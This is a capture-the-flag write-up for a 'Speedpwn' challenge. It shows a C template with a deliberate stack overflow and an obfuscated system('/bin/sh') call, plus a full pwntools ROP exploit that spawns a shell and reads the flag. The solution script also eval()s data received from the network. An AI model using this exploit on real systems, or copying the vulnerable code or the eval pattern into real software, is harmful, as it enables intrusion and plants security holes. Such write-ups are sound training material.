# Description(s) 
- Challenge name: Speedpwn
- Proposed difficulty: Hard
- Challenge description:

    Stop doing stuff manually,
    race sonic and get a shell!

    `nc speedpwn.hkn 1024`


# Writeup

The challenge will compile a unique binary and send it to the user.
The user then has 4 seconds to make an exploit, and exploit the server.

The following template is used:
```
#include <stdio.h>
#include <memory.h>
#include <ctype.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>


char *sanc = "          .,\n\
.      _,'f----.._\n\
|\ ,-'\"/  |     ,'\n\
|,_  ,--.      /\n\
/,-. ,'`.     (_\n\
f  o|  o|__     \"`-.\n\
,-._.,--'_ `.   _.,-`\n\
`\"' ___.,'` j,-'\n\
  `-.__.,--'\n\
";

__rd_funcs__

char cp = 0;

void ring1() {
    cp ^= 1;
}

void ring2() {
    cp ^= 2;
}

void ring3() {
    cp ^= 4;
}

void finish(int signum){
 
  puts("Too slow, cya!");
  exit(-1);
}
 

void win() {
    char bs[] = "(eni(to";
    for (char c = 0; c < strlen(bs); c++) {
        bs[c] ^= cp;
    }
    system(bs);
}

void vulnerable() {
    
    char b[__buf_sz__];
    read(0, b, __buf_rd__);
    return;
}


int main(int argc, char **argv) {
    puts(sanc);
    puts("Nothing personal kid...");
    setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGALRM, finish);
    alarm(4);
    vulnerable();
}

```
Here we can see that the varying factors are the buffer size being read into, as well as the number of chars being read.
Another randomization factor is a number of dummy functions at `__rd_funcs__`.

The fact that these are the varying factors should be inferrable by the user after downloading a few binaries.

In order to exploit the binary, the user needs to call `ring1`, `ring2`, `ring3` in any order and finally `win` this is done using return oriented programming.

By reading the file from the server and using an ELF parsing library we can get the addresses of the four functions. 
```
exploit += p64(p.symbols["ring1"])
exploit += p64(p.symbols["ring2"])
exploit += p64(p.symbols["ring3"])
exploit += p64(p.symbols["win"])
```

We line these up in a ROP chain.
Now the padding in front (the buffer size) needs to be determined.
The lazy solution is by parsing the disassembly of the `vulnerable` function and extracting the stack setup.
This looks like `sub rsp, x` where x is the stack size.
`sz = int(p.disasm(p.symbols["vulnerable"], 20).split("sub    rsp, ")[1].split('\n')[0], 16)+8`
We add 8 to override RBP and hit the return address.

Finally the solution looks like 
```
from pwn import *

r = remote("localhost", 1024)

bin = eval(r.recvline()[:-4])
open("./out", "wb").write(bin)

p = ELF("./out")

sz = int(p.disasm(p.symbols["vulnerable"], 20).split("sub    rsp, ")[1].split('\n')[0], 16)+8

log.info(f"Guessing padding size to {sz}")

padding = sz
exploit = b"A"*padding
exploit += p64(p.symbols["ring1"])
exploit += p64(p.symbols["ring2"])
exploit += p64(p.symbols["ring3"])
exploit += p64(p.symbols["win"])

open("exploit", "wb").write(exploit)

r.sendline(exploit)
r.sendline("cat flag")
r.interactive()
```
